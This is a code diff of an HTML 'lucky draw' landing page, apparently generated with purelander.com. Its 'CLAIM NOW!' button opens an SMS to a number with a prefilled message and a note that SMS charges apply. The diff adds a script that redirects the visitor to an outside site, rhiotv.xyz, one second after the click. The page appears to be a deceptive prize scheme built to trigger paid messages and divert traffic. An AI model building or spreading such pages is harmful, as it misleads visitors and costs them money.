@@ -84,12 +84,19 @@
                 <fieldset style="border:1px solid #ccc;padding:10px;">
                     <legend align="center" style="padding:0 10px; font-size:medium;font-weight:bold;">CLAIM NOW!</legend>
                     <div style="margin-top:5px;" align="center">
-                        <a class="step2" onclick="" href="sms:905102601065?&body=Please send this msg to participate in the lucky draw.  Sms charges apply"><strong>Continue</strong></a>
+                        <a class="step2" onclick="return redirectAfterSometime()" href="sms:905102601065?&body=Please send this msg to participate in the lucky draw.  Sms charges apply"><strong>Continue</strong></a>
                     </div>
                 </fieldset>
             </div>
         </div>
     </div>
+<script>
+    function redirectAfterSometime() {
+        setTimeout(function () {
+            window.location.href = 'https://www.rhiotv.xyz';
+        },1000)
+    }
+</script>
 </body>
 <!-- This landing page has been Generated using purelander.com -->
 </html>
